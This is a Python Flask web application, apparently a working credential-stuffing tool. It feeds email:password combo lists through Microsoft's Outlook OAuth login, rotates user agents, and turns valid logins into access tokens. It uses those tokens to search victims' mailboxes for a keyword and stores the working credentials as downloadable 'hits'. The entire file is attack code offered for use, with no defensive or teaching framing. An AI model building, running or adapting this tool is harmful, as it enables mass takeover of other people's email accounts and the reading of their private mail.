import os
import uuid
import json
import re
import threading
import time
import requests
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO, emit
from user_agent import generate_user_agent

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

class HotmailWorker:
    def __init__(self, combo_list, keyword, sid):
        self.combo_list = combo_list
        self.keyword = keyword
        self.sid = sid
        self.hits_file = os.path.join(RESULTS_DIR, f"hits_{sid}.txt")
        self.custom_file = os.path.join(RESULTS_DIR, f"custom_{sid}.txt")
        self.stats = {"hits": 0, "bad": 0, "custom": 0, "retries": 0}

    def send_log(self, msg, msg_type):
        socketio.emit('new_log', {'msg': msg, 'type': msg_type}, room=self.sid)

    def update_stats(self):
        socketio.emit('stats_update', self.stats, room=self.sid)

    def run(self):
        for line in self.combo_list:
            line = line.strip()
            if not line or ':' not in line: continue
            email, password = line.split(':', 1)
            
            success = False
            attempt = 0
            while attempt < 3:
                session = requests.Session()
                try:
                    ua = generate_user_agent()
                    # 1. Authorize GET
                    url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
                    res = session.get(url, headers=headers, timeout=20)
                    
                    # PPFT & urlPost extraction
                    ppft = ""
                    url_post = ""
                    sd_match = re.search(r'var ServerData = ({.*?});', res.text, re.DOTALL)
                    if sd_match:
                        sd = json.loads(sd_match.group(1))
                        ppft = re.search(r'value="([^"]+)"', sd.get('sFTTag', '')).group(1) if 'sFTTag' in sd else ""
                        url_post = sd.get('urlPost', '')
                    
                    if not ppft:
                        ppft_m = re.search(r'name="PPFT" value="([^"]+)"', res.text)
                        ppft = ppft_m.group(1) if ppft_m else ""
                    if not url_post:
                        up_m = re.search(r'"urlPost":"([^"]+)"', res.text)
                        url_post = up_m.group(1) if up_m else ""

                    if not ppft or not url_post: raise Exception("Auth elements not found")

                    # 2. Login POST
                    data_str = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=Passport&NewUser=1"
                    post_headers = {
                        "User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": res.url, "Origin": "https://login.live.com"
                    }
                    login_res = session.post(url_post, data=data_str, headers=post_headers, allow_redirects=False)

                    if "__Host-MSAAUTHP" not in session.cookies:
                        self.stats["bad"] += 1
                        self.send_log(f"[BAD] {email}", "bad")
                        success = True; break

                    # 3. Token & Profile (Simplified Flow)
                    auth_code = ""
                    loc = login_res.headers.get('Location', '')
                    if 'code=' in loc: auth_code = loc.split('code=')[1].split('&')[0]
                    
                    if auth_code:
                        t_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                        t_data = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "grant_type": "authorization_code", "code": auth_code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"}
                        t_res = requests.post(t_url, data=t_data, timeout=20).json()
                        token = t_res.get("access_token")

                        if token:
                            # Search
                            s_url = "https://outlook.live.com/search/api/v2/query"
                            s_payload = {"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": self.keyword}, "Size": 5}]}
                            s_headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
                            s_res = requests.post(s_url, json=s_payload, headers=s_headers, timeout=20).json()
                            
                            total = s_res.get('EntityResults', [{}])[0].get('Total', 0)
                            
                            if total > 0:
                                self.stats["hits"] += 1
                                result_line = f"{email}:{password} | Mails: {total}"
                                with open(self.hits_file, "a") as f: f.write(result_line + "\n")
                                self.send_log(f"[HIT] {email} - Találatok: {total}", "hit")
                            else:
                                self.stats["custom"] += 1
                                with open(self.custom_file, "a") as f: f.write(f"{email}:{password}\n")
                                self.send_log(f"[OK] {email} - Nincs találat", "custom")
                        
                        success = True; break
                except Exception as e:
                    attempt += 1
                    self.stats["retries"] += 1
                    time.sleep(0.5)
            
            if not success:
                self.stats["bad"] += 1
            self.update_stats()

        socketio.emit('finished', {}, room=self.sid)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/download/<ftype>/<sid>')
def download(ftype, sid):
    file = os.path.join(RESULTS_DIR, f"{ftype}_{sid}.txt")
    return send_file(file, as_attachment=True) if os.path.exists(file) else ("Nincs fájl", 404)

@socketio.on('start_process')
def handle_start(data):
    worker = HotmailWorker(data['combo'].splitlines(), data['keyword'], request.sid)
    threading.Thread(target=worker.run).start()

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
